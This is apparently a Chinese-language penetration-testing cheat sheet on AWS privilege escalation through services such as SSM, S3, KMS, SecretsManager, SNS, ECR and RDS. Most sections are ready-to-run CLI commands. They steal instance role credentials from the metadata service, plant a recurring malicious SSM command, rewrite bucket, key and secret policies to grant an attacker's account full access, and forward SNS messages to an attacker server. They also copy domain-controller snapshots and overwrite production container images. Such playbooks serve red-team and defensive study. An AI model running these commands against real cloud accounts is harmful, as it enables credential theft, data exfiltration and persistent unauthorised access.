# 其他服务提权

本文档覆盖数据服务、安全服务和基础设施服务的提权路径，包括 S3、DynamoDB、RDS、KMS、SecretsManager、SNS、SQS、SSM、ECR、EBS、Lightsail 等。

## SSM（Systems Manager）

### ssm:SendCommand — 远程命令执行

**所需权限**：`ssm:SendCommand`

在运行 SSM Agent 的实例上执行命令，窃取实例角色凭据。

```bash
# 发现可控实例
aws ssm describe-instance-information

# 执行命令
aws ssm send-command --instance-ids <instance_id> \
  --document-name "AWS-RunShellScript" \
  --parameters 'commands=["curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ && curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role_name>"]'
```

### ssm:StartSession — 交互式 Shell

**所需权限**：`ssm:StartSession`

```bash
aws ssm start-session --target <instance_id>
```

还可用于进入 ECS 容器（需 ExecuteCommand 已启用）：

```bash
aws ssm start-session --target "ecs:<cluster>_<task_id>_<runtime_id>"
```

### ssm:DescribeParameters + ssm:GetParameter — 读取参数存储

**所需权限**：`ssm:DescribeParameters`、`ssm:GetParameter`

参数存储中常保存 SSH 密钥、API 密钥、数据库密码等敏感信息。

```bash
aws ssm describe-parameters
aws ssm get-parameter --name <param_name> --with-decryption
```

### ssm:CreateAssociation — 持久化命令执行

**所需权限**：`ssm:CreateAssociation`

创建状态管理器关联，以固定间隔自动执行命令。

```bash
aws ssm create-association --name AWS-RunShellScript \
  --targets Key=InstanceIds,Values=<instance_id> \
  --parameters 'commands=["<malicious_command>"]' \
  --schedule-expression "rate(30 minutes)"
```

## S3

### s3:PutObject + s3:GetObject — 配置文件篡改

**所需权限**：`s3:PutObject`、`s3:GetObject`

许多服务将配置存储在 S3 中，修改这些文件可间接提权：

- **CloudFormation 模板桶**：劫持部署，注入恶意资源
- **EC2 UserData 脚本桶**：注入恶意代码
- **Terraform 状态文件**（`.tfstate`）：注入恶意资源定义获取 RCE
- **CodeBuild buildspec.yml**：修改构建命令

```bash
# 下载 CloudFormation 模板
aws s3 cp s3://cf-templates-<region>-<account>/template.json ./

# 修改后上传
aws s3 cp ./template.json s3://cf-templates-<region>-<account>/template.json
```

### s3:PutBucketNotification — 部署劫持

配合 `s3:PutObject` 和 `s3:GetObject` 权限，利用桶通知劫持 CloudFormation 部署。在模板上传到部署之间的短暂窗口内替换内容。

Pacu 模块 `cfn__resource_injection` 可自动化此攻击。

### s3:PutBucketPolicy — 桶策略修改

**所需权限**：`s3:PutBucketPolicy`（需来自同一账户）

```bash
aws s3api put-bucket-policy --bucket <bucket> --policy '{
  "Version":"2012-10-17",
  "Statement":[{"Effect":"Allow","Principal":{"AWS":"<attacker_arn>"},"Action":"s3:*","Resource":["arn:aws:s3:::<bucket>","arn:aws:s3:::<bucket>/*"]}]
}'
```

### s3:GetBucketAcl + s3:PutBucketAcl — ACL 修改

```bash
aws s3api put-bucket-acl --bucket <bucket> --access-control-policy file://acl.json
```

## DynamoDB

### dynamodb:PutResourcePolicy — 资源策略注入

**所需权限**：`dynamodb:PutResourcePolicy`

自 2024 年 3 月起 DynamoDB 支持资源策略。攻击者可授予自己或外部账户对表的完全访问权限。管理员授予 `dynamodb:Put*` 时可能意外包含此权限。

```bash
aws dynamodb put-resource-policy --resource-arn <table_arn> \
  --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"<attacker_arn>"},"Action":"dynamodb:*","Resource":"<table_arn>"}]}'
```

**注意**：DynamoDB 表中可能包含 AWS 凭据或可触发 Lambda 代码注入的数据。

## RDS

### rds:ModifyDBInstance — 重置数据库密码

**所需权限**：`rds:ModifyDBInstance`

```bash
aws rds modify-db-instance --db-instance-identifier <db_id> \
  --master-user-password 'NewP@ss123!' --apply-immediately
```

**前提**：需要能够网络连接到数据库实例（通常只能从 VPC 内部访问）。

### rds:AddRoleToDBCluster + iam:PassRole — 角色注入

将高权限角色附加到 RDS 集群，通过数据库函数（如 PostgreSQL 的 `aws_s3` 扩展）访问 AWS 资源。

```bash
aws rds add-role-to-db-cluster --db-cluster-identifier <cluster> \
  --role-arn <high_priv_role_arn>
```

### 数据库内提权（Aurora PostgreSQL/MySQL）

已在数据库内时，利用已附加的 IAM 角色通过扩展访问 S3：

```sql
-- PostgreSQL
SELECT aws_s3.table_import_from_s3('ttemp','','(format text)',
  aws_commons.create_s3_uri('bucket-name','secret-file.txt','us-east-1'));

-- MySQL
LOAD DATA FROM S3 's3://mybucket/data.txt' INTO TABLE ttemp(col);
```

## KMS

### kms:PutKeyPolicy — 密钥策略修改

**所需权限**：`kms:PutKeyPolicy`（可选 `kms:ListKeys`、`kms:GetKeyPolicy`）

修改 KMS 密钥策略，授予攻击者完全控制。

```bash
aws kms put-key-policy --key-id <key_id> --policy-name default \
  --policy '{"Version":"2012-10-17","Statement":[
    {"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::<account>:root"},"Action":"kms:*","Resource":"*"},
    {"Effect":"Allow","Principal":{"AWS":"<attacker_arn>"},"Action":"kms:*","Resource":"*"}
  ]}'
```

### kms:CreateGrant — 密钥使用授权

**所需权限**：`kms:CreateGrant`

```bash
aws kms create-grant --key-id <key_id> \
  --grantee-principal <attacker_arn> --operations Decrypt Encrypt
```

**注意**：Grant 生效可能需要几分钟。

### kms:CreateKey + kms:ReplicateKey — 密钥复制提权

将多区域 KMS 密钥复制到其他区域，并设置更宽松的策略。

```bash
aws kms replicate-key --key-id <mrk_key_id> --replica-region <region> \
  --bypass-policy-lockout-safety-check \
  --policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"*"},"Action":"kms:*","Resource":"*"}]}'
```

## SecretsManager

### secretsmanager:GetSecretValue — 读取密钥

**所需权限**：`secretsmanager:GetSecretValue`

```bash
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id <secret_name>
```

### secretsmanager:PutResourcePolicy — 资源策略修改

授予外部账户访问密钥的权限。

```bash
aws secretsmanager put-resource-policy --secret-id <secret_name> \
  --resource-policy '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"<attacker_account_arn>"},"Action":"secretsmanager:GetSecretValue","Resource":"*"}]}'
```

## SNS

### sns:Subscribe — 消息窃听

**所需权限**：`sns:Subscribe`

订阅 SNS 主题获取敏感信息。

```bash
aws sns subscribe --topic-arn <topic_arn> --protocol https \
  --endpoint https://<attacker_server>/sns
```

### sns:AddPermission — 授予未授权访问

```bash
aws sns add-permission --topic-arn <topic_arn> --label attacker \
  --aws-account-id <attacker_account> --action-name Publish Subscribe
```

### SNS 触发 Lambda（无 SourceArn 限制）

当 Lambda 资源策略允许 `sns.amazonaws.com` 调用但未限制 `SourceArn` 时，攻击者可创建自己的 SNS 主题订阅目标 Lambda 并触发执行。

```bash
TOPIC=$(aws sns create-topic --name attacker-topic --query TopicArn --output text)
aws sns subscribe --topic-arn $TOPIC --protocol lambda \
  --notification-endpoint <victim_lambda_arn>
aws sns publish --topic-arn $TOPIC --message '<attacker_controlled_input>'
```

## SQS

### sqs:AddPermission — 队列访问授权

```bash
aws sqs add-permission --queue-url <url> --label attacker \
  --aws-account-ids <attacker_account> --actions SendMessage ReceiveMessage
```

### sqs:ReceiveMessage — 消息窃取

```bash
aws sqs receive-message --queue-url <url>
```

## ECR

### ecr:SetRepositoryPolicy — 仓库策略修改

修改 ECR 仓库策略，允许未授权拉取或推送镜像。

```bash
aws ecr set-repository-policy --repository-name <repo> \
  --policy-text '{"Version":"2008-10-17","Statement":[{"Effect":"Allow","Principal":"*","Action":["ecr:BatchGetImage","ecr:GetDownloadUrlForLayer"]}]}'
```

### ecr:PutImage — 镜像标签覆盖（供应链攻击）

覆盖已有标签（如 `stable`、`prod`）为恶意镜像，影响下游 Lambda 容器函数、ECS 服务等。

### ecr:CreatePullThroughCacheRule — 缓存规则劫持

创建拉取缓存规则映射攻击者控制的上游仓库到受信任的私有 ECR 前缀。

```bash
aws ecr create-pull-through-cache-rule --ecr-repository-prefix trusted \
  --upstream-registry-url public.ecr.aws
```

## EBS

### ebs:ListSnapshotBlocks + ebs:GetSnapshotBlock — 快照数据窃取

**所需权限**：`ebs:ListSnapshotBlocks`、`ebs:GetSnapshotBlock`、`ec2:DescribeSnapshots`

下载 EBS 快照并在本地分析，可提取凭据、密码（如 Active Directory NTDS.dit）。

工具：CloudCopy（自动化从域控制器提取密码哈希）。

### ec2:CreateSnapshot — 域控快照

```bash
aws ec2 create-snapshot --volume-id <dc_volume_id> --description "privesc"
```

## CloudFormation（无 PassRole）

### cloudformation:UpdateStack — 利用已附加角色

**所需权限**：`cloudformation:UpdateStack`（或 `cloudformation:SetStackPolicy` 获取该权限）

无需 PassRole，直接利用已有 Stack 的附加角色。

```bash
aws cloudformation update-stack --stack-name <existing_stack> \
  --template-url https://<bucket>.s3.amazonaws.com/malicious.json \
  --capabilities CAPABILITY_IAM
```

### cloudformation:CreateChangeSet + cloudformation:ExecuteChangeSet

```bash
aws cloudformation create-change-set --stack-name <stack> \
  --change-set-name privesc --change-set-type UPDATE \
  --template-url https://<bucket>.s3.amazonaws.com/template.json \
  --capabilities CAPABILITY_IAM
aws cloudformation execute-change-set --change-set-name privesc --stack-name <stack>
```

## Lightsail

### lightsail:DownloadDefaultKeyPair / GetInstanceAccessDetails

**注意**：Lightsail 使用 AWS 托管账户角色而非用户 IAM 角色，无法用于 IAM 级别提权。但可获取实例内敏感信息。

```bash
aws lightsail download-default-key-pair
aws lightsail get-instance-access-details --instance-name <name>
```

### lightsail:GetRelationalDatabaseMasterUserPassword

```bash
aws lightsail get-relational-database-master-user-password \
  --relational-database-name <name>
```

## EventBridge（无 PassRole）

### 已有高权限 Scheduler 角色

如果已有 EventBridge Scheduler 使用高权限角色，可通过 `scheduler:UpdateSchedule` 修改目标执行任意 API。

## Redshift

### redshift:GetClusterCredentials

获取 Redshift 集群的临时数据库凭据，可用于访问数据库内的敏感数据。

```bash
aws redshift get-cluster-credentials --db-user <user> \
  --cluster-identifier <cluster_id> --database-name <db>
```

## EFS

### elasticfilesystem:PutFileSystemPolicy

修改 EFS 文件系统策略，授予未授权访问。

## Route53 / ACM-PCA

### route53:CreateHostedZone + route53:ChangeResourceRecordSets + acm-pca:IssueCertificate

创建托管区域、修改 DNS 记录并利用 ACM 私有 CA 签发证书，可用于中间人攻击。
